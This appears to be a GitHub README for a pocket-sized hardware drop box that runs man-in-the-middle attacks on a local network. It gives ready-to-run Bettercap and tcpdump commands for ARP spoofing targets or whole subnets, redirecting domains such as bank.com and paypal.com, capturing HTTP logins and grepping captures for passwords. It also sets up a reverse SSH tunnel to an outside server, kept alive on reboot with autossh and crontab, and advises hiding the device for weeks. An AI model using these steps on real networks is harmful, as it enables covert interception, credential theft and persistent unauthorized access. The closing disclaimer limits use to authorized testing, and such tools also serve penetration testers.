# Tunnel R.A.T. - Network MITM & Remote Access Tool

Tunnel R.A.T. (Remote Access & Traffic interception) is a portable network penetration testing platform built on the NanoPi Zero2. It combines packet interception, DNS spoofing, HTTP manipulation, and persistent remote access into a single, inconspicuous device.

**Form Factor:** Looks like a small router (inconspicuous)  
**Cost:** ~$50  
**Size:** Credit card sized  
**Power:** USB  
**Deployment:** Portable - fits in a pocket

---

## Features

### 1. **ARP Spoofing**

ARP (Address Resolution Protocol) normally helps devices find each other on a network by mapping IP addresses to MAC addresses. ARP spoofing tricks target devices into thinking YOUR device is the network gateway.

**How it works:**
- Target device sends traffic meant for the router
- Tunnel R.A.T. intercepts it instead
- Traffic is forwarded to the real gateway
- Target has no idea traffic is being captured

**Real-world use:** Position on a network, become the man-in-the-middle, capture everything that flows through.

---

### 2. **Packet Capture (PCAP)**

Every bit of data that flows through the device gets recorded to an industry-standard PCAP file for analysis.

**What gets captured:**
- DNS queries (reveals what websites are accessed)
- HTTP traffic (unencrypted web requests)
- HTTPS traffic (encrypted, but metadata visible)
- Network protocols (all Layer 3+ traffic)

**File format:** PCAP - opens in Wireshark, tcpdump, or any network analyzer  
**Output location:** `/opt/tunnel-rat/captures/packets.pcap`

**Real-world use:** Understand network traffic patterns, identify data leakage, analyze communication protocols.

---

### 3. **DNS Spoofing**

DNS normally translates domain names to IP addresses (example.com → 93.184.216.34). DNS spoofing lets you lie about what IP an address points to.

**What you can do:**
- Redirect domains to your server
- Block access to specific websites
- Redirect users to fake login pages (for testing)
- Redirect traffic to honeypots for analysis

**Example:** User requests bank.com, DNS spoof redirects them to your controlled server instead.

**Real-world use:** Test if users notice credential harvesting, assess phishing vulnerability, redirect traffic for MITM analysis.

---

### 4. **Network Reconnaissance (nmap)**

Automated scanning to discover what devices are connected to the network and what services they're running.

**What you learn:**
- All connected devices and their IP addresses
- Open ports on each device
- Running services and versions
- Operating system type and version
- Device manufacturer

**Example:** Scan reveals an old camera running unpatched firmware on port 8080.

**Real-world use:** Vulnerability assessment, device inventory, service discovery.

---

### 5. **HTTP Interception**

HTTP is unencrypted web traffic. Bettercap's HTTP proxy lets you see AND modify traffic in real-time before it reaches the target or server.

**What you can see/do:**
- Read login credentials sent over HTTP
- View form submissions
- Modify web page content before display
- Inject content into responses
- Strip cookies or session tokens

**IMPORTANT:** HTTPS is encrypted. You cannot intercept HTTPS without additional techniques (SSL stripping - advanced).

**Example:** User submits login form over HTTP, you capture credentials before they reach the server.

**Real-world use:** Assess unencrypted traffic risk, test security awareness, demonstrate protocol vulnerabilities.

---

### 6. **Remote SSH Access**

Deploy Tunnel R.A.T. on a target network, then control it remotely from anywhere in the world.

**How it works:**
1. Device establishes a reverse SSH tunnel to your remote server
2. You connect to your remote server on a designated port
3. Connection tunnels back to the NanoPi
4. Full shell access over secure encrypted channel

**Setup:**
```bash
# On Tunnel R.A.T., establish reverse tunnel to your server
ssh -R 2222:localhost:22 user@your-server.com

# From anywhere, connect back through your server
ssh -p 2222 root@localhost
```

**Real-world use:** Deploy device, leave location, monitor and control from anywhere days/weeks later. Persistent access without needing to return physically.

---

### 7. **Persistent Deployment**

The combination of small size, low cost, and hidden placement creates long-term monitoring capability.

**Why it matters:**
- **Size:** Fits in a pocket or behind a desk
- **Appearance:** Looks like a small router - inconspicuous
- **Power:** USB - can hide near any outlet
- **Cost:** ~$50 - replaceable if discovered
- **Durability:** Runs Linux 24/7 without attention

**Real-world use:** Place device in break room, network closet, or under desk. Monitor network activity continuously over weeks/months.

---

## Complete Workflow

1. **Position device** on target network via ethernet
2. **Enable ARP spoofing** to become man-in-the-middle
3. **Packet capture** logs all traffic to PCAP
4. **DNS spoofing** redirects selected domains
5. **HTTP proxy** intercepts unencrypted web traffic
6. **Network scan** identifies connected devices
7. **Remote SSH** gives you persistent access from anywhere

Result: Complete visibility and control of network traffic with remote access capability.

---

## Hardware Requirements

- **NanoPi Zero2** (RK3528A, ARM64)
- **microSD card** (32GB recommended)
- **Ethernet adapter** (USB-C to RJ45)
- **Power adapter** (USB-C, 5V/2A minimum)
- **WiFi module** (optional, for bridge mode)

---

## Installation

### Option 1: Git Clone (Recommended)

```bash
git clone https://github.com/CyberChuck01/Tunnel-R.A.T.git
cd Tunnel-R.A.T
sudo bash install-tunnel-rat.sh
```

### Option 2: SCP Copy (If no git on device)

**From your local machine (Windows/Mac/Linux), copy files to NanoPi:**

```bash
# Get the installer script
scp install-tunnel-rat.sh root@192.168.1.X:/root/

# SSH into device
ssh root@192.168.1.X

# Run installer
cd /root
sudo bash install-tunnel-rat.sh
```

**Windows (PowerShell):**

```powershell
# Copy installer using SCP
scp C:\Users\cgese\Tunnel-R.A.T\install-tunnel-rat.sh root@192.168.1.X:/root/

# SSH into device
ssh root@192.168.1.X

# Then on device:
cd /root
sudo bash install-tunnel-rat.sh
```

**If SCP not found on Windows:**
- Install **Git Bash** from https://git-scm.com/download/win
- Then use the same SCP command in Git Bash terminal

### Option 3: Copy entire repo via SCP

```bash
# Copy entire Tunnel-R.A.T folder to device
scp -r C:\Users\cgese\Tunnel-R.A.T root@192.168.1.X:/opt/

# SSH into device
ssh root@192.168.1.X

# Move to correct location and run installer
cd /opt/Tunnel-R.A.T
sudo bash install-tunnel-rat.sh
```

---

## Hardware Installation

1. **Flash Armbian** on microSD card (NanoPi Zero2 compatible)
2. **Boot device** with microSD
3. **Connect ethernet** (USB-C to RJ45 adapter)
4. **Find device IP:**
   ```bash
   nmap -sn 192.168.1.0/24
   # Look for NanoPi hostname
   ```
5. **SSH into device:**
   ```bash
   ssh root@192.168.1.X
   # Default password: 1234 (change after login!)
   ```
6. **Run installer** (using any option above)

---

## Usage

### Start Tunnel R.A.T.

```bash
sudo /opt/tunnel-rat/scripts/tunnel-rat.sh
```

This starts Bettercap with the MITM configuration loaded.

---

### 1. ARP Spoofing - Start MITM Attack

Once Bettercap is running, enable ARP spoofing:

```bash
# In Bettercap interactive prompt:
set arp.spoof.targets <target-ip>
arp.spoof on

# Example - spoof specific target:
set arp.spoof.targets 192.168.1.100
arp.spoof on

# Spoof entire subnet:
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# Stop ARP spoofing:
arp.spoof off
```

**Verify it's working:**
```bash
# Watch ARP packets being sent
tcpdump -i eth0 arp
```

---

### 2. Packet Capture (PCAP) - Record All Traffic

Start packet capture with tcpdump:

```bash
# Capture all packets to PCAP file
sudo tcpdump -i eth0 -w /opt/tunnel-rat/captures/packets.pcap

# Capture with size limit (rotate files)
sudo tcpdump -i eth0 -w /opt/tunnel-rat/captures/packets.pcap -C 100

# Capture DNS queries only
sudo tcpdump -i eth0 -w /opt/tunnel-rat/captures/dns.pcap port 53

# Capture HTTP traffic only
sudo tcpdump -i eth0 -w /opt/tunnel-rat/captures/http.pcap port 80
```

**Analyze captured packets:**

```bash
# Read PCAP file with tcpdump
tcpdump -r /opt/tunnel-rat/captures/packets.pcap

# Extract DNS queries
tcpdump -r /opt/tunnel-rat/captures/packets.pcap 'port 53' -A

# Extract HTTP requests
tcpdump -r /opt/tunnel-rat/captures/packets.pcap 'port 80' -A

# Show only source/destination IPs
tcpdump -r /opt/tunnel-rat/captures/packets.pcap -q

# Open in Wireshark GUI (if X11 available)
wireshark /opt/tunnel-rat/captures/packets.pcap &
```

---

### 3. DNS Spoofing - Redirect Domains

Enable DNS spoofing in Bettercap:

```bash
# In Bettercap interactive prompt:

# Redirect single domain
set dns.spoof.domains example.com
set dns.spoof.all false
dns.spoof on

# Redirect multiple domains
set dns.spoof.domains example.com,bank.com,paypal.com
dns.spoof on

# Redirect all requests to your IP
set dns.spoof.all true
set dns.spoof.domains *
dns.spoof on

# Check what's configured
dns.spoof

# Stop DNS spoofing
dns.spoof off
```

**Verify DNS spoof is working:**

```bash
# From target device, test DNS resolution
nslookup example.com 192.168.1.X  # Replace X with Tunnel R.A.T. IP

# Watch DNS packets
tcpdump -i eth0 port 53 -A
```

---

### 4. Network Reconnaissance - Scan Network

Use nmap to discover devices and services:

```bash
# Basic network scan - find all devices
nmap -sn 192.168.1.0/24

# Aggressive scan with service detection
nmap -sV -sC 192.168.1.0/24

# Scan for open ports on specific device
nmap -p- 192.168.1.100

# Scan specific port range
nmap -p 22,80,443,8080 192.168.1.0/24

# OS detection
nmap -O 192.168.1.100

# Output results to file
nmap -sV 192.168.1.0/24 -oN /opt/tunnel-rat/nmap-results.txt

# Aggressive scan (slower, more detailed)
nmap -A 192.168.1.100

# Scan and save as XML (for parsing)
nmap -sV 192.168.1.0/24 -oX /opt/tunnel-rat/nmap-results.xml
```

**Analyze results:**

```bash
# View nmap output
cat /opt/tunnel-rat/nmap-results.txt

# Parse XML results
grep "open" /opt/tunnel-rat/nmap-results.xml
```

---

### 5. HTTP Interception - Read & Modify Web Traffic

Enable HTTP proxy in Bettercap:

```bash
# In Bettercap interactive prompt:

# Enable HTTP proxy
set http.proxy.port 8080
http.proxy on

# View intercepted credentials
# (Bettercap logs them automatically)

# Monitor proxy traffic
```

**From target machine, configure proxy:**

```bash
# Linux/Mac
export http_proxy=http://192.168.1.X:8080
curl http://example.com

# Or system-wide proxy settings to 192.168.1.X:8080
```

**View intercepted traffic:**

```bash
# Bettercap logs HTTP requests to console
# Look for authentication attempts in Bettercap output

# Monitor with tcpdump
tcpdump -i eth0 'tcp port 80' -A | grep -i 'password\|username\|get\|post'

# Check for credential leaks
grep -r "password" /opt/tunnel-rat/captures/
```

**HTTPS Traffic (encrypted - visibility only):**

```bash
# Monitor HTTPS connection metadata (not content)
tcpdump -i eth0 'tcp port 443' -v

# See which domains are accessed over HTTPS
tcpdump -i eth0 'tcp port 443' -A | grep -i 'host:'
```

---

### 6. Remote SSH Access - Persistent Control

Set up persistent reverse SSH tunnel:

**On Tunnel R.A.T. device:**

```bash
# Create reverse tunnel to your remote server
# This allows access from anywhere
ssh -N -R 2222:localhost:22 username@your-server.com &

# Make it persistent (survives connection drops)
ssh -N -R 2222:localhost:22 -o ServerAliveInterval=60 \
    -o ServerAliveCountMax=3 username@your-server.com &

# Automated startup (add to crontab)
crontab -e
# Add this line:
# @reboot ssh -N -R 2222:localhost:22 -o ServerAliveInterval=60 username@your-server.com
```

**From your remote server or anywhere else:**

```bash
# Connect to Tunnel R.A.T. through your server
ssh -p 2222 root@localhost

# Or if your server has a domain
ssh -p 2222 root@your-server.com
```

**Advanced - Keep tunnel alive with autossh:**

```bash
# Install autossh for automatic reconnection
sudo apt install autossh

# Use autossh instead (auto-reconnects if dropped)
autossh -M 20000 -N -R 2222:localhost:22 \
    -o ServerAliveInterval=60 \
    username@your-server.com &

# Add to crontab for persistence across reboots
@reboot autossh -M 20000 -N -R 2222:localhost:22 \
    -o ServerAliveInterval=60 username@your-server.com
```

**Verify tunnel is active:**

```bash
# On your server, check for listening port
netstat -tulpn | grep 2222

# Or from anywhere
ssh -p 2222 root@your-server.com "whoami"
```

---

### 7. Persistent Deployment - Auto-Start Services

Make Tunnel R.A.T. run automatically on boot:

```bash
# Create systemd service
sudo nano /etc/systemd/system/tunnel-rat.service
```

**Paste this:**

```ini
[Unit]
Description=Tunnel R.A.T. MITM Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/tunnel-rat
ExecStart=/opt/tunnel-rat/scripts/tunnel-rat.sh
Restart=on-failure
RestartSec=10

[Install]
WantedBy=multi-user.target
```

**Enable and start service:**

```bash
# Enable service
sudo systemctl enable tunnel-rat.service

# Start service
sudo systemctl start tunnel-rat.service

# Check status
sudo systemctl status tunnel-rat.service

# View logs
sudo journalctl -u tunnel-rat.service -f
```

**Setup persistent SSH tunnel on boot:**

```bash
# Add to root's crontab
sudo crontab -e

# Add this line:
@reboot autossh -M 20000 -N -R 2222:localhost:22 \
    -o ServerAliveInterval=60 \
    -i /root/.ssh/id_rsa username@your-server.com
```

**Verify services running:**

```bash
# Check if tunnel-rat is running
systemctl is-active tunnel-rat.service

# Check if SSH tunnel is active
ps aux | grep autossh

# Check open ports
ss -tulpn
```

---

### Complete Workflow Example

```bash
# 1. SSH into device
ssh root@192.168.1.X

# 2. Start Tunnel R.A.T.
sudo /opt/tunnel-rat/scripts/tunnel-rat.sh

# 3. In another terminal, start packet capture
sudo tcpdump -i eth0 -w /opt/tunnel-rat/captures/capture.pcap

# 4. In Bettercap prompt, enable ARP spoof
set arp.spoof.targets 192.168.1.100
arp.spoof on

# 5. Enable DNS spoof (optional)
set dns.spoof.domains evil.com
dns.spoof on

# 6. Enable HTTP interception (optional)
http.proxy on

# 7. Monitor output
# Bettercap shows captured credentials/traffic in real-time

# 8. When done, stop services
arp.spoof off
dns.spoof off
http.proxy off
exit

# 9. Analyze captured packets
tcpdump -r /opt/tunnel-rat/captures/capture.pcap -A
```

---

### Check Active Processes

```bash
# See what's running
sudo ps aux | grep -E 'bettercap|tcpdump|tunnel'

# Check listening ports
sudo ss -tulpn

# Monitor network interfaces
ifconfig
ip addr show

# See real-time network stats
nethogs
```

---

## Troubleshooting

### Bettercap Won't Start

**Problem:** `command not found` or `bettercap binary not found`

**Solution:**

```bash
# Check if Bettercap is installed
which bettercap

# If not found, rebuild from source
cd /tmp
git clone https://github.com/bettercap/bettercap.git
cd bettercap
sudo go build -o /usr/local/bin/bettercap .

# Verify installation
bettercap -v
```

**Problem:** Permission denied error

**Solution:**

```bash
# Bettercap needs elevated privileges
sudo bettercap -iface eth0

# Or add capabilities (if running without sudo needed)
sudo setcap cap_net_admin,cap_net_raw=ep /usr/local/bin/bettercap
```

**Problem:** `panic: failed to get interface`

**Solution:**

```bash
# Check available network interfaces
ip link show

# Make sure your interface exists (usually eth0 for ethernet)
ifconfig

# Start with explicit interface
sudo bettercap -iface eth0
```

---

### ARP Spoof Not Working / Targets Not Detected

**Problem:** `arp.spoof on` doesn't show traffic interception

**Solution 1 - Verify target is reachable:**

```bash
# Ping target to confirm it's on network
ping 192.168.1.100

# If no response, target may be offline or different subnet
# Check what's actually on the network
nmap -sn 192.168.1.0/24
```

**Solution 2 - Check ARP configuration:**

```bash
# In Bettercap prompt, verify settings
arp.spoof

# Make sure target is set correctly
set arp.spoof.targets 192.168.1.100
# For multiple targets
set arp.spoof.targets 192.168.1.100,192.168.1.101

# Verify it's enabled
arp.spoof on

# Watch ARP packets being sent
! tcpdump -i eth0 arp -v
```

**Solution 3 - Interface issue:**

```bash
# Make sure you're on the right interface
net.show

# If wrong interface, restart with correct one
# (exit Bettercap and restart)
sudo bettercap -iface eth0
```

**Solution 4 - Gateway detection:**

```bash
# In Bettercap, check if gateway was detected
net.show

# If gateway shows as 0.0.0.0, specify it manually
set arp.spoof.fullduplex true
set arp.spoof.targets <target-ip>
arp.spoof on
```

---

### Packets Not Being Captured

**Problem:** `tcpdump: command not found`

**Solution:**

```bash
# Install tcpdump
sudo apt update
sudo apt install tcpdump

# Verify installation
tcpdump --version
```

**Problem:** Permission denied when running tcpdump

**Solution:**

```bash
# Run with sudo
sudo tcpdump -i eth0 -w /opt/tunnel-rat/captures/packets.pcap

# Or add capabilities (one-time)
sudo setcap cap_net_admin,cap_net_raw=ep /usr/bin/tcpdump

# Then run without sudo
tcpdump -i eth0 -w /opt/tunnel-rat/captures/packets.pcap
```

**Problem:** No packets captured even though ARP spoof is on

**Solution:**

```bash
# Verify ARP spoof is actually working
# Watch for ARP replies
tcpdump -i eth0 arp -v

# If no ARP traffic, spoof isn't working
# Check target is actually sending traffic
# Try pinging target from another device

# Make sure capture is on right interface
ip link show
# Capture on correct interface (usually eth0, not lo)
sudo tcpdump -i eth0 -w /opt/tunnel-rat/captures/packets.pcap
```

**Problem:** PCAP file empty or very small

**Solution:**

```bash
# Let capture run longer (minimum 30 seconds for traffic)
# Press Ctrl+C after 30+ seconds

# Check file size
ls -lh /opt/tunnel-rat/captures/packets.pcap

# Verify the interface has traffic
tcpdump -i eth0 -c 10
# This should show at least some packets in 10 seconds
```

---

### DNS Spoof Not Working

**Problem:** Targets still resolve to real IP addresses

**Solution 1 - Check DNS is routing through device:**

```bash
# Verify device is MITM (ARP spoof working first)
arp.spoof on

# Check if target's DNS queries are being captured
tcpdump -i eth0 port 53 -v

# If no DNS traffic, target isn't using device as gateway
```

**Solution 2 - Verify DNS spoof configuration:**

```bash
# In Bettercap prompt, check DNS settings
dns.spoof

# Set domains explicitly
set dns.spoof.domains example.com
set dns.spoof.all false
dns.spoof on

# Test from target machine
nslookup example.com 192.168.1.X
# Should resolve to your Tunnel R.A.T. IP
```

**Solution 3 - DNS might be cached:**

```bash
# On target machine, flush DNS cache
# Linux:
sudo systemctl restart systemd-resolved

# Windows:
ipconfig /flushdns

# macOS:
sudo dscacheutil -flushcache

# Then test again
nslookup example.com 192.168.1.X
```

**Solution 4 - Bettercap DNS not running:**

```bash
# Enable DNS proxy explicitly
dns.proxy on

# Verify it's listening
ss -tulpn | grep 53
# Should show listening on :53
```

---

### SSH Tunnel Keeps Disconnecting

**Problem:** `Connection reset by peer` or tunnel goes down after hours

**Solution 1 - Enable keepalive:**

```bash
# Use ServerAliveInterval to keep connection alive
ssh -N -R 2222:localhost:22 \
    -o ServerAliveInterval=60 \
    -o ServerAliveCountMax=3 \
    username@your-server.com

# Or add to ~/.ssh/config
Host your-server.com
    ServerAliveInterval 60
    ServerAliveCountMax 3
```

**Solution 2 - Use autossh for auto-reconnection:**

```bash
# Install autossh
sudo apt install autossh

# Use autossh instead (auto-reconnects on disconnect)
autossh -M 20000 -N -R 2222:localhost:22 \
    -o ServerAliveInterval=60 \
    username@your-server.com &
```

**Solution 3 - Add to crontab for persistent restart:**

```bash
# Edit crontab
sudo crontab -e

# Add this line (restarts tunnel every hour)
0 * * * * pkill -f "autossh.*your-server"; autossh -M 20000 -N -R 2222:localhost:22 -o ServerAliveInterval=60 username@your-server.com

# Or at reboot
@reboot autossh -M 20000 -N -R 2222:localhost:22 -o ServerAliveInterval=60 username@your-server.com
```

**Problem:** `Permission denied (publickey)`

**Solution:**

```bash
# Generate SSH key if you don't have one
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa

# Copy public key to remote server
ssh-copy-id -i ~/.ssh/id_rsa.pub username@your-server.com

# Test connection
ssh username@your-server.com

# Then try tunnel
autossh -M 20000 -N -R 2222:localhost:22 username@your-server.com
```

---

### HTTP Proxy Not Intercepting Traffic

**Problem:** No credentials or HTTP traffic showing up

**Solution 1 - Enable HTTP proxy:**

```bash
# In Bettercap prompt
http.proxy on

# Verify it's listening
ss -tulpn | grep 8080
# Should show 8080 listening
```

**Solution 2 - Target must use proxy:**

```bash
# Automatic (if ARP spoof is working with gateway detection):
# Traffic should automatically route through proxy

# Manual proxy setup on target:
# Linux/Mac: export http_proxy=http://192.168.1.X:8080
# Windows: Settings > Network > Proxy > 192.168.1.X:8080
# Browser: Proxy settings pointing to 192.168.1.X:8080
```

**Solution 3 - HTTPS traffic won't show content:**

```bash
# HTTPS is encrypted, you can't see credentials
# You can only see that HTTPS traffic occurred

# Watch unencrypted HTTP only
tcpdump -i eth0 port 80 -A | grep -i 'password\|username'

# For HTTPS, user must visit unencrypted site (http://)
```

**Solution 4 - Verify target is sending traffic:**

```bash
# Make sure target is actually browsing
# Watch traffic on device
tcpdump -i eth0 -v | grep -i 'http\|port 80'

# If no traffic, target may be:
# - Not connected to your MITM
# - Using HTTPS only
# - Not browsing while you're listening
```

---

### Network Interface Problems

**Problem:** `No such device` when trying to spoof

**Solution:**

```bash
# List all available interfaces
ip link show
# or
ifconfig -a

# Check which interface is connected to target network
ethtool eth0

# Start Bettercap with correct interface
sudo bettercap -iface eth0
```

**Problem:** Interface doesn't have an IP address

**Solution:**

```bash
# Check interface status
ip addr show eth0

# If no IP, assign one
sudo ip addr add 192.168.1.X/24 dev eth0
sudo ip link set eth0 up

# Or use DHCP
sudo dhclient eth0

# Verify IP is assigned
ip addr show eth0
```

**Problem:** Can't connect ethernet - interface not detected

**Solution:**

```bash
# Check if USB ethernet adapter is recognized
lsusb

# Check if driver is loaded
lsmod | grep usbnet

# Update network interface list
sudo ip link set eth0 up

# Try different device name (might be eth1, enp0s20u1u1, etc)
ip link show
```

---

### Permission Denied / Sudo Issues

**Problem:** `Operation not permitted` even with sudo

**Solution:**

```bash
# Verify you're actually running as root
whoami
# Should output: root

# If not root, use sudo
sudo bettercap -iface eth0

# Check sudo permissions
sudo -l
```

**Problem:** Bettercap service won't start with systemd

**Solution:**

```bash
# Check service status and error
sudo systemctl status tunnel-rat.service

# View detailed error log
sudo journalctl -u tunnel-rat.service -n 50

# Make sure script is executable
sudo chmod +x /opt/tunnel-rat/scripts/tunnel-rat.sh

# Test script manually
sudo /opt/tunnel-rat/scripts/tunnel-rat.sh
```

---

### Can't Connect to Device

**Problem:** `Connection refused` when SSHing to NanoPi

**Solution:**

```bash
# Check if SSH server is running
sudo systemctl status ssh

# If not running, start it
sudo systemctl start ssh
sudo systemctl enable ssh

# Check SSH is listening
sudo ss -tulpn | grep :22
```

**Problem:** Device not on network / IP not found

**Solution:**

```bash
# Scan network to find device
nmap -sn 192.168.1.0/24

# Or check router's connected devices

# Try connecting with hostname (if configured)
ssh root@nanopi.local

# If that fails, get IP from router's DHCP list
# Then use that IP:
ssh root@192.168.1.X
```

**Problem:** `ssh: connect to host ... port 22: Connection timed out`

**Solution:**

```bash
# Check device is powered on and connected
ping 192.168.1.X

# If no ping response, device may be:
# - Off
# - Not connected to network
# - On different subnet

# Verify device has network cable connected
# Check ethernet light is on

# If using WiFi module, check it's configured
sudo iwconfig
```

---

### Common Error Messages

| Error | Cause | Solution |
|-------|-------|----------|
| `bind: Address already in use` | Port 8080 already in use | Kill existing process: `sudo lsof -i :8080 \| kill` |
| `operation not permitted` | Need sudo | Prefix command with `sudo` |
| `failed to get interface` | Wrong interface name | Use `ip link show` to find correct name |
| `interface down` | Interface not up | Run `sudo ip link set eth0 up` |
| `panic: invalid memory address` | Bettercap crash | Restart service, check logs |
| `connection reset by peer` | SSH tunnel dropped | Use autossh, add ServerAliveInterval |
| `no route to host` | Device unreachable | Check ARP spoof is working, verify IP |
| `permission denied (publickey)` | SSH key issue | Copy SSH key: `ssh-copy-id -i ~/.ssh/id_rsa.pub user@server` |
| `tcpdump: permission denied` | Need root | Run with `sudo tcpdump` |
| `bettercap: command not found` | Not installed | Run install script: `sudo bash install-tunnel-rat.sh` |

---

### Still Not Working?

**Debugging steps:**

```bash
# 1. Check all services are running
systemctl status tunnel-rat.service
ps aux | grep bettercap

# 2. Check network connectivity
ping 192.168.1.1
ip addr show
netstat -i

# 3. Check error logs
sudo journalctl -u tunnel-rat.service -f
sudo dmesg | tail -20

# 4. Verify Bettercap runs manually
sudo bettercap -iface eth0 -debug

# 5. Check file permissions
ls -la /opt/tunnel-rat/scripts/
ls -la /opt/tunnel-rat/captures/

# 6. Verify dependencies installed
which bettercap
which tcpdump
which nmap
```

**If still stuck:**

```bash
# Collect diagnostic info for troubleshooting
echo "=== System Info ===" > /tmp/tunnel-rat-debug.txt
uname -a >> /tmp/tunnel-rat-debug.txt
echo "" >> /tmp/tunnel-rat-debug.txt

echo "=== Network Interfaces ===" >> /tmp/tunnel-rat-debug.txt
ip addr show >> /tmp/tunnel-rat-debug.txt
echo "" >> /tmp/tunnel-rat-debug.txt

echo "=== Running Processes ===" >> /tmp/tunnel-rat-debug.txt
ps aux | grep tunnel >> /tmp/tunnel-rat-debug.txt
echo "" >> /tmp/tunnel-rat-debug.txt

echo "=== Service Status ===" >> /tmp/tunnel-rat-debug.txt
systemctl status tunnel-rat.service >> /tmp/tunnel-rat-debug.txt
echo "" >> /tmp/tunnel-rat-debug.txt

echo "=== Recent Logs ===" >> /tmp/tunnel-rat-debug.txt
journalctl -u tunnel-rat.service -n 50 >> /tmp/tunnel-rat-debug.txt

cat /tmp/tunnel-rat-debug.txt
```

Share this diagnostic output when asking for help.

---

## Disclaimer

**Authorized Testing Only**

This tool is designed for legitimate penetration testing and network security assessment **only**. Use only on networks you own or have explicit written permission to test.

Unauthorized access to computer systems is illegal under laws including the Computer Fraud and Abuse Act (CFAA) in the US and similar laws worldwide.

---

## Files in This Repository

```
Tunnel-R.A.T/
├── README.md (this file)
├── install-tunnel-rat.sh (automated installer)
├── scripts/
│   └── tunnel-rat.sh (main startup script)
├── config/
│   └── tunnel-rat.conf (configuration)
├── caplets/
│   └── mitm.cap (Bettercap MITM profile)
├── captures/
│   └── (PCAP files saved here)
└── docs/
    └── (additional documentation)
```

---

## License

MIT License - See LICENSE file for details

---

**Created by CyberChuck01** for authorized penetration testing and security research.
